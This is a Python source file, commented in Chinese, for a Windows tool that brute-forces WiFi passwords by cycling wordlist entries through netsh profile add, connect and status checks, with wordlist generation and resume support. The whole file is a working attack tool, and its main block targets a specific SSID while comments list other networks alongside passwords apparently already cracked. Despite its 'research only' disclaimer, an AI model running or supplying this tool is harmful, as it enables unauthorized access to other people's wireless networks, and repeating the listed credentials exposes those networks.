# -*- coding:utf-8 -*- #

# Author: YKDX
# Version: V5.15.2524
# Date Creation: 2025/2/4-2
# Date Modified: 2025/2/12-3
# Program Name: WK_System_Integration_Scripts(WK_SIS)

"""
项目简介:
WK_SIS是一个用于自动化爆破WiFi的脚本。
WK_SIS的主要目的是为了自动化处理WiFi相关指令，提高WiFi爆破效率。

注意事项:
1. 仅供研究学习使用，切勿用于非法途径。
2. 本脚本仅支持Windows 10及以上的操作系统(目前未考虑操作系统兼容性)。
3. 密码本需要用户自己手动添加(推荐)或使用generate_codebook模块生成。
"""

from shutil import rmtree
from os import path, mkdir
from subprocess import run
from platform import system
from json import load, dump
from time import sleep, time
from datetime import datetime
from itertools import product
from xml.etree import ElementTree
from locale import getpreferredencoding
from logging import StreamHandler, FileHandler, Formatter, Logger, DEBUG, INFO

# 获取本地编码
local_encoding = getpreferredencoding()
# 配置输出日志
logger = Logger("wk_logger")


# 环境检测
def environmental_detection() -> bool:
    """
    环境检测。

    返回:
        bool: 如果环境检测通过则返回True，否则返回False。
    """

    try:
        # 检测操作系统是否为Windows系统
        if system() != "Windows":
            logger.error("当前版本仅支持Windows 10及以上的操作系统")
            return False

        return True
    except Exception as error:
        logger.error(f"环境检测\n错误信息: {error}")
        return False


# 初始化路径
def initialize_paths(folder_path: str) -> dict:
    """
    初始化集成目录。

    参数:
        folder_path (str): 父目录路径。

    返回:
        dict: 集成目录的字典。
    """

    if not path.exists(folder_path):
        logger.error(f"路径无效: {folder_path}")
        return {}

    parent_dir = path.join(folder_path, "WiFiKey")
    integration_dir = {
        # 注意: 父目录必须在子目录之前创建
        "parent_dir": parent_dir,
        "log": path.join(parent_dir, "Log"),
        "data": path.join(parent_dir, "Data"),
        "wifi_profile": path.join(parent_dir, "WiFi_Profile"),
    }

    # 创建集成目录对应的文件夹
    for directory in integration_dir.values():
        try:
            mkdir(directory)
            logger.info(f"创建目录: {directory}")
        except FileExistsError:
            continue

    return integration_dir


# 配置日志
def setup_logging(logging_path: str, level: int = INFO) -> None:
    """
    配置日志记录器的级别和格式。

    参数:
        log_path (str): 日志文件路径。
        level (int): 日志级别，默认为 INFO。

    返回:
        None
    """

    # 默认日志格式
    log_format = Formatter("%(asctime)s - %(levelname)s - %(lineno)d - %(message)s")

    # DEBUG日志格式
    if level == DEBUG:
        log_format = Formatter("%(asctime)s - %(levelname)s - %(funcName)s - %(lineno)d - %(message)s")

    # 控制台输出流
    terminal_handler = StreamHandler()
    # 设置控制台日志等级
    terminal_handler.setLevel(level)
    # 设置控制台日志格式
    terminal_handler.setFormatter(log_format)
    # 将日志记录器添加到终端日志记录器
    logger.addHandler(terminal_handler)

    # 文件输出流 编码格式不可修改
    file_handler = FileHandler(path.join(logging_path, f"{datetime.now().strftime("%Y年-%m月-%d日")}.log"), encoding="utf-8")
    # 设置文件日志等级
    file_handler.setLevel(level)
    # 设置文件日志格式
    file_handler.setFormatter(log_format)
    # 将文件处理器添加到文件日志记录器
    logger.addHandler(file_handler)
    pass


# WiFi检测
def wifi_detection(ssid: str) -> bool:
    """
    检测指定的SSID是否存在于当前可用的无线网络列表中。

    参数:
        ssid (str): 要检测的无线网络的SSID。

    返回:
        bool: 如果SSID存在则返回True，否则返回False。
    """

    detect_command = f"netsh wlan show networks | findstr /r /i \"\\<{ssid}\\>\" > nul && echo True"

    try:
        command_result = run(detect_command, text=True, shell=True, capture_output=True, encoding=local_encoding)

        if logger.isEnabledFor(DEBUG):
            logger.debug(f"WiFi检测\n输出结果: {command_result}")

        return command_result.returncode == 0 and bool(command_result.stdout)
    except Exception as error:
        logger.error(f"WiFi检测\n错误信息: {error}")
        return False


# 断开WiFi
def disconnect_wifi() -> bool:
    """
    断开当前连接的无线网络。

    返回:
        bool: 如果成功断开连接则返回True，否则返回False。
    """

    disconnect_command = "netsh wlan disconnect"

    try:
        command_result = run(disconnect_command, text=True, capture_output=True, encoding=local_encoding)

        if logger.isEnabledFor(DEBUG):
            logger.debug(f"断开WiFi\n输出结果: {command_result}")

        return command_result.returncode == 0
    except Exception as error:
        logger.error(f"断开WiFi\n错误信息: {error}")
        return False


# 移除配置
def remove_configuration(ssid: str) -> bool:
    """
    移除指定SSID的无线网络配置文件。

    参数:
        ssid (str): 要移除的无线网络的SSID。

    返回:
        bool: 如果成功移除配置文件则返回True，否则返回False。
    """

    remove_command = f"netsh wlan delete profile name=\"{ssid}\""

    try:
        command_result = run(remove_command, text=True, capture_output=True, encoding=local_encoding)

        if logger.isEnabledFor(DEBUG):
            logger.debug(f"移除配置\n输出结果: {command_result}")

        return command_result.returncode == 0
    except Exception as error:
        logger.error(f"移除配置\n错误信息: {error}")
        return False


# 生成配置
def build_configuration(wifi_ssid: str, wifi_password: str, output_path: str) -> str:
    """
    生成一个包含指定SSID和密码的无线网络配置文件。

    参数:
        wifi_ssid (str): 无线网络的SSID。
        wifi_password (str): 无线网络的密码。
        output_path (str): 配置文件的输出路径。
    返回:
        str: 生成的配置文件的路径。
    """

    # 创建根元素
    wlan_profile = ElementTree.Element("WLANProfile", xmlns="http://www.microsoft.com/networking/WLAN/profile/v1")

    # 添加 <name> 元素
    name = ElementTree.SubElement(wlan_profile, "name")
    name.text = wifi_ssid

    # 添加 <SSIDConfig> 元素
    ssid_config = ElementTree.SubElement(wlan_profile, "SSIDConfig")
    ssid = ElementTree.SubElement(ssid_config, "SSID")

    # 添加 <name> 元素
    ssid_name = ElementTree.SubElement(ssid, "name")
    ssid_name.text = wifi_ssid

    # 添加 <connectionType> 和 <connectionMode> 元素
    connection_type = ElementTree.SubElement(wlan_profile, "connectionType")
    connection_type.text = "ESS"
    connection_mode = ElementTree.SubElement(wlan_profile, "connectionMode")
    connection_mode.text = "auto"

    # 添加 <MSM> 元素
    msm = ElementTree.SubElement(wlan_profile, "MSM")
    security = ElementTree.SubElement(msm, "security")

    # 添加 <authEncryption> 元素
    auth_encryption = ElementTree.SubElement(security, "authEncryption")
    authentication = ElementTree.SubElement(auth_encryption, "authentication")
    authentication.text = "WPA2PSK"
    encryption = ElementTree.SubElement(auth_encryption, "encryption")
    encryption.text = "AES"
    use_one_x = ElementTree.SubElement(auth_encryption, "useOneX")
    use_one_x.text = "false"

    # 添加 <sharedKey> 元素
    shared_key = ElementTree.SubElement(security, "sharedKey")
    key_type = ElementTree.SubElement(shared_key, "keyType")
    key_type.text = "passPhrase"
    protected = ElementTree.SubElement(shared_key, "protected")
    protected.text = "false"
    key_material = ElementTree.SubElement(shared_key, "keyMaterial")
    key_material.text = wifi_password

    # 创建 XML 树
    tree = ElementTree.ElementTree(wlan_profile)
    profile_path = path.join(output_path, "wifi_profile.xml")

    with open(file=profile_path, mode="wb") as wlan_file:
        # 编码格式不可修改
        tree.write(wlan_file, xml_declaration=True)

    if logger.isEnabledFor(DEBUG):
        logger.debug(f"成功生成配置文件: {profile_path}\n")

    return profile_path


# 添加配置
def add_configuration(profile_path: str) -> bool:
    """
    添加无线网络配置文件。

    参数:
        profile_path (str): 配置文件的路径。

    返回:
        bool: 如果成功添加配置文件则返回True，否则返回False。
    """

    add_command = f"netsh wlan add profile filename=\"{profile_path}\""

    try:
        command_result = run(add_command, text=True, capture_output=True, encoding=local_encoding)

        if logger.isEnabledFor(DEBUG):
            logger.debug(f"添加配置\n输出结果: {command_result}")

        return command_result.returncode == 0
    except Exception as error:
        logger.error(f"添加配置\n错误信息: {error}")
        return False


# 连接WiFi
def connect_wifi(ssid: str) -> bool:
    """
    连接到指定的无线网络。

    参数:
        ssid (str): 要连接的无线网络的SSID。

    返回:
        bool: 如果成功连接则返回True，否则返回False。
    """

    connect_command = f"netsh wlan connect name=\"{ssid}\" ssid=\"{ssid}\""

    try:
        command_result = run(connect_command, text=True, capture_output=True, encoding=local_encoding)

        if logger.isEnabledFor(DEBUG):
            logger.debug(f"连接WiFi\n输出结果: {command_result}")

        return command_result.returncode == 0
    except Exception as error:
        logger.error(f"连接WiFi\n错误信息: {error}")
        return False


# WiFi状态
def wifi_status(ssid: str) -> bool:
    """
    检查当前无线网络连接状态。

    返回:
        bool: 如果已连接到无线网络则返回True，否则返回False。
    """

    wlan_command = f"netsh wlan show interfaces | findstr /r /i \"\\<已连接\\>\" > nul && echo True"
    ssid_command = f"netsh wlan show interfaces | findstr /r /i \"\\<{ssid}\\>\" > nul && echo True"

    try:
        wlan_result = run(wlan_command, text=True, shell=True, capture_output=True, encoding=local_encoding)
        ssid_result = run(ssid_command, text=True, shell=True, capture_output=True, encoding=local_encoding)

        if logger.isEnabledFor(DEBUG):
            logger.debug(f"WiFi状态\n输出结果: {wlan_result}")

        return wlan_result.returncode == 0 and ssid_result.returncode == 0 and bool(wlan_result.stdout) and bool(ssid_result.stdout)
    except Exception as command_error:
        logger.error(f"WiFi状态\n错误信息: {command_error}")
        return False


# 读取索引
def read_index(wifi_name: str, codebook_name: str, input_path: str) -> list or None:
    """
    从索引文件中读取指定WiFi名称和密码本名称的索引信息。

    参数:
        wifi_name (str): 要读取索引的WiFi名称。
        codebook_name (str): 要读取索引的密码本名称。
        input_path (str): 索引文件的路径。

    返回:
        list: 包含索引信息的列表，如果未找到则返回空列表。
    """

    index_path = path.join(input_path, "wifi_index.json")

    if not path.exists(index_path):
        with open(file=index_path, mode="w", encoding=local_encoding) as index_file:
            index_file.write("{}")

        logger.info(f"已创建WiFi索引本: {index_path}\n")
        return []

    with open(file=index_path, mode="r", encoding=local_encoding) as index_file:
        try:
            # 读取json数据
            json_data = load(index_file)
        except ValueError:
            logger.error(f"密码索引读取失败\n{index_file}")
            return []

        if wifi_name in json_data and codebook_name in json_data[wifi_name]:
            data_result = json_data[wifi_name][codebook_name]
            logger.info(f"成功读取 {wifi_name} - {codebook_name} 密码索引: {data_result.get("CODEBOOK_SEEK")}")
            return [data_result.get("CODEBOOK_SEEK"), data_result.get("PREVIOUS_PASSWORD")]


# 写入索引
def write_index(wifi_name: str, codebook_name: str, additional_information: dict, input_path: str) -> None:
    """
    将指定WiFi名称、密码本名称和附加信息写入索引文件。

    参数:
        wifi_name (str): 要写入索引的WiFi名称。
        codebook_name (str): 要写入索引的密码本名称。
        additional_information (dict): 要写入的附加信息，包括密码和密码索引。
        input_path (str): 索引文件的路径。

    返回:
        None
    """

    codebook_path = additional_information["codebook_path"]
    index_path = path.join(input_path, "wifi_index.json")

    data_templates = {
        "CODEBOOK_PATH": codebook_path,
        "STORAGE_TIME": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "PREVIOUS_PASSWORD": additional_information["previous_password"],
        "CODEBOOK_SEEK": additional_information["codebook_seek"],
    }

    # 读取json数据
    with open(file=index_path, mode="r", encoding=local_encoding) as index_file:
        try:
            read_data = load(index_file)
        except ValueError:
            logger.error(f"密码索引写入失败: {index_path}")
            return

    if wifi_name in read_data:
        read_data[wifi_name][codebook_name] = data_templates
    else:
        read_data[wifi_name] = {codebook_name: data_templates}

    # 写入更新后的json数据
    with open(file=index_path, mode="w", encoding=local_encoding) as index_file:
        dump(read_data, index_file, indent=5, ensure_ascii=False)

    logger.debug(f"成功更新 {wifi_name} - {codebook_name} 密码索引: {additional_information["codebook_seek"]}")
    pass


# WiFi爆破
def wifi_blasting(ssid: str, codebook_path: str, output_path: str, timeout: int = 10, log_level: int = INFO) -> None:
    """
    对指定的WiFi进行爆破。

    参数:
        ssid (str): 要爆破的WiFi的SSID。
        codebook_path (str): 密码本的路径。
        output_path (str): 输出路径。
        timeout (int): 超时时间，默认为10秒。

    返回:
        None
    """

    recording_begins = datetime.now()
    codebook_seek = connect_times = 0
    integration_dir = initialize_paths(folder_path=output_path)

    if not integration_dir:
        logger.error(f"初始化路径失败")
        return

    log_dir = integration_dir.get("log")
    data_dir = integration_dir.get("data")
    profile_dir = integration_dir.get("wifi_profile")
    setup_logging(level=log_level, logging_path=log_dir)

    logger.warning(f"开始爆破WiFi: {ssid}")
    file_index = read_index(wifi_name=ssid, codebook_name=path.split(codebook_path)[1], input_path=data_dir)

    # 环境检测
    if not environmental_detection():
        return

    # 判断密码本是否存在
    if not path.exists(codebook_path):
        logger.error(f"密码本路径错误: {codebook_path}")
        return

    with open(file=codebook_path, mode="r", encoding=local_encoding) as codebook_file:
        # 设置偏移量
        if file_index:
            codebook_seek = file_index[0]
            codebook_file.seek(codebook_seek)
            logger.info(f"成功设置偏移量: {codebook_seek} - 偏移密码: {file_index[1]}\n")

        # 读取密码本
        for password in codebook_file:
            codebook_seek += len(password)

            if not password:
                continue

            # 检测WiFi是否正确断开
            if not disconnect_wifi():
                logger.error(f"断开WiFi失败: {ssid}")
                return

            connect_times += 1
            password = password.strip()
            timeout_period = cumulative_period = time()
            profile_path = build_configuration(wifi_ssid=ssid, wifi_password=password, output_path=profile_dir)
            logger.info(f"WiFi名称: {ssid} - 连接次数: {connect_times} - 校验时长: {datetime.now() - recording_begins} - 校验密码: {password}")

            # 写入索引
            write_index(
                wifi_name=ssid,
                input_path=data_dir,
                additional_information={
                    "codebook_path": codebook_path,
                    "previous_password": password,
                    "codebook_seek": codebook_seek,
                },
                codebook_name=path.split(codebook_path)[1],
            )

            if not remove_configuration(ssid=ssid):
                logger.error(f"移除配置失败: {ssid}")
                return

            if profile_path == "":
                logger.error(f"生成配置失败: {ssid}")
                return

            if not add_configuration(profile_path=profile_path):
                logger.error(f"添加配置失败: {ssid} - 密码: {password}")
                continue

            # 检测指定WiFi是否存在
            while True:
                scan_duration = time() - timeout_period
                detection_result = wifi_detection(ssid=ssid)

                if scan_duration > timeout:
                    logger.error(f"扫描超时: {ssid}")
                    return

                if detection_result:
                    logger.debug(f"成功扫描到指定WiFi: {ssid} - 扫描时长: {scan_duration}")
                    break

            # 检测WiFi连接状态
            while True:
                connect_duration = time() - timeout_period

                if connect_duration > 2 or "connect_result" not in locals():
                    timeout_period = time()
                    connect_result = connect_wifi(ssid=ssid)
                    logger.debug(f"发送WiFi连接申请: {ssid}")

                if time() - cumulative_period > timeout:
                    logger.error(f"连接超时: {ssid}")
                    break

                if connect_result:
                    logger.debug(f"成功发送WiFi连接申请: {ssid} - 连接时长: {connect_duration}")
                    break

                sleep(0.05)

            # 检测WiFi接口状态
            for _ in range(2):
                delay_duration = time() - timeout_period

                if delay_duration < 0.5:
                    delay_duration = 0.5

                sleep(delay_duration)
                status_result = wifi_status(ssid=ssid)

                if status_result:
                    logger.warning(f"WiFi名称: {ssid} - WiFi密码: {password} - 校验时长: {datetime.now() - recording_begins}")
                    return

        logger.info(f"在密码本 {path.split(codebook_path)[1]} 中未找到 {ssid} 的有效密码 - 校验时长: {datetime.now() - recording_begins}")
    pass


# 生成密码本
def generate_codebook(output_path: str, iterable_objects: str, repetitions_times: int = 5, cycle_quantity: int = 50000) -> None:
    """
    生成密码本，使用可迭代对象生成指定长度的密码组合。

    参数:
        output_path (str): 输出路径。
        iterable_objects (str): 可迭代对象。
        repetitions_times (int): 重复次数，默认为8。
        cycle_quantity (int): 循环数量，默认为50000。

    返回:
        None
    """

    start_time = datetime.now()
    logger.warning("开始生成密码本")
    codebook_path = path.join(output_path, "Codebook")
    cumulative_separations = cumulative_generation = 0

    try:
        rmtree(codebook_path)
        logger.info(f"删除目录: {codebook_path}")
    except FileNotFoundError:
        pass

    # 创建密码本目录
    mkdir(codebook_path)
    logger.info(f"创建目录: {codebook_path}")
    # 打开初始文件
    codebook_file = open(file=f"{path.join(codebook_path, f"Serial_Number{cumulative_generation}")}.txt", mode="w", encoding=local_encoding)

    # 利用笛卡尔积生成密码
    for codebook_result in product(iterable_objects, repeat=repetitions_times):
        # 单个密码本一次性写入的密码数量
        if cumulative_separations >= cycle_quantity:
            codebook_file.close()
            codebook_file = open(file=f"{path.join(codebook_path, f"Serial_Number{cumulative_generation}")}.txt", mode="w", encoding=local_encoding)

            logger.info(f"密码序列: {cumulative_generation} - 生成进度: {"".join(codebook_result)} - 累计时长: {datetime.now() - start_time}")
            cumulative_generation += 1
            cumulative_separations = 0

        cumulative_separations += 1
        codebook_file.write(f"{"".join(codebook_result)}\n")

    # 关闭最后一个文件
    codebook_file.close()
    logger.warning(f"成功生成密码本 - 累计时长: {datetime.now() - start_time}")
    pass


# 处理密码本
def handle_codebooks(input_path: str, output_path: str) -> None:
    """
    处理密码本，去除重复行和小于8位的密码。

    参数:
        input_path (str): 输入密码本路径。
        output_path (str): 输出密码本路径。

    返回:
        None
    """

    # 使用集合来存储唯一值
    unique_lines = set()
    valid_password = invalid_password = 0
    logger.warning(f"开始处理密码本: {input_path}")

    # 判断密码本是否存在
    if not path.exists(input_path):
        logger.error(f"密码本路径错误: {input_path}")
        return

    try:
        input_file = open(file=input_path, mode="r", encoding=local_encoding)
        output_file = open(file=output_path, mode="w", encoding=local_encoding)

        for line in input_file:
            line = line.strip()

            # 跳过小于8位的密码
            if len(line) < 8:
                invalid_password += 1
                continue

            if line not in unique_lines:
                valid_password += 1
                unique_lines.add(line)
                output_file.write(line + "\n")

        input_file.close()
        output_file.close()
    except UnicodeDecodeError:
        logger.error(f"解码错误: {input_path}")

    logger.warning(f"成功处理密码本: {output_path} - 有效密码: {valid_password} - 无效密码: {invalid_password}")
    pass


if __name__ == "__main__":
    # Xiaomi_E81D -> 0123456789
    # ChinaNet-paYgz4 -> 12312312

    # Hotdor ->
    # HONOR-0510I8 ->
    # TP-LINK_E149 ->
    # HONOR-0510I8_Wi-Fi5 - >

    ssid = "HONOR-0510I8"
    output_path = r"C:\Users\Lenovo\Downloads"
    dividing_line = "-".center(130, "-")
    codebook_path = r"C:\programming\Python-Project\Project\WiFiKey项目\密码集\一位字母开头加生日数字.txt"

    try:
        wifi_blasting(ssid=ssid, codebook_path=codebook_path, timeout=100, output_path=output_path, log_level=INFO)
    except KeyboardInterrupt:
        logger.warning(f"用户手动停止 wifi_blasting 模块的运行\n{dividing_line}")
    except Exception as error:
        logger.error(f"\n{error}\n{dividing_line}")

    # handle_codebooks(input_path=r"", output_path=r"C:\Users\Lenovo\Downloads\处理.txt")
    # generate_codebook(output_path=r"C:\Users\Lenovo\Downloads", iterable_objects="0123456789", repetitions_times=5)
    pass